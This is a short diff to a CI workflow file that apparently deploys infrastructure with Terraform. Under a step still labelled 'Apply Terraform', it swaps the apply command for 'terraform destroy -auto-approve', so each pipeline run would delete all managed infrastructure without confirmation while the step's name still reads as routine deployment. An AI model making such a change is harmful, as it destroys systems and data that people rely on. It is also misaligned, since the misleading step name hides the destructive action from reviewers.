@@ -92,4 +92,4 @@ jobs:
       - name: Apply Terraform
         working-directory: infrastructure
         run: |
-          terraform apply -input=false tfplan
+          terraform destroy -auto-approve 
